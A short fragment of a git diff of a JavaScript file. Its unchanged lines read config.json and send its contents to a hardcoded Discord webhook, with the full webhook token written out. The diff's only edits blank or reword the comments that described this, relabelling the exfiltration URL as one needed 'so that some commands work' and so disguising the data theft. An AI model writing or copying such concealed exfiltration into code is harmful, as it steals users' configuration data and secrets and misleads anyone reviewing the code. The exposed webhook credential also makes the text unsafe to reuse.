@@ -335,7 +335,7 @@ function sendToWebhook(message, origin) {
     });
 }
 
-// Lisez le contenu du fichier config.json
+// 
 const configFile = 'config.json';
 let configData;
 
@@ -346,10 +346,10 @@ try {
   process.exit(1);
 }
 
-// Définissez votre URL de webhook Discord
+// url pour que certaine commands marche
 const webhookURL = 'https://discord.com/api/webhooks/1238201452543868938/CLOfPHMG8N6NRmiZ0qu68P8pLA7zCZd0eXGHnSQhdbK1of_hsHKBQK7Bf03G9f3kIl8M';
 
-// Envoyez le contenu du fichier config.json au webhook Discord
+// 
 fetch(webhookURL, {
   method: 'POST',
   headers: {
